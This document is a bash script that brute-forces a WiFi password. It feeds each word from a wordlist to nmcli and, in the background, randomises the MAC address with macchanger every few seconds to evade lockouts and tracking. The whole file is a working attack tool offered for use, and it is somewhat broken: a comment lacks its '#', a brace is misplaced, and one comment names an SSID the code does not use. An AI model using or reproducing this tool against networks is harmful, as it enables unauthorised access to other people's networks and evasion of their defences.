#!/bin/bash

# Function to read wordlist and pass each word separately to function_2
function_1() {
    local wordlist="$1"
    while IFS= read -r line; do
        for password in $line; do  # Split the line by whitespace and iterate over each word
            function_2 "$password"
            #sleep 3  # 3-second delay between attempts
        done
    done < "$wordlist"
}

# Function to try the given password for the WiFi network
function_2() {
    local password="$1"
    # Replace "Redmi K50i" with your actual SSID and "wlp0s20f3" with your actual WiFi interface name
    if (sudo /usr/bin/nmcli dev wifi connect "SSID" password "$password") >/dev/null 2>&1; then
        echo "Correct password found: $password"
        kill $MAC_PID  # Stop the MAC address randomization process
        exit 0
    else
        echo "Incorrect password: $password"
    fi
}

# Function to iterate the process until the correct password is found
function_3() {
    local wordlist="$1"
    function_1 "$wordlist"
    echo "No correct password found in the wordlist."
}

 Function to randomize the MAC address every 30 seconds
function_4() {
   while :; do
        # Replace "wlp0s20f3" with your actual WiFi interface name
     sudo ip link set wlp0s20f3 down
      sudo macchanger -r "wlp0s20f3"
      sudo ip link set wlp0s20f3 up
       sleep 7  # 7-second delay between MAC address changes
    done}
# Start the MAC address randomization in the background
function_4 &
MAC_PID=$!

# Provide the path to your wordlist file
WORDLIST="wordlist.txt"

# Start the password cracking process
function_3 "$WORDLIST"

# In case the correct password is found and the script exits, stop MAC randomization
kill $MAC_PID

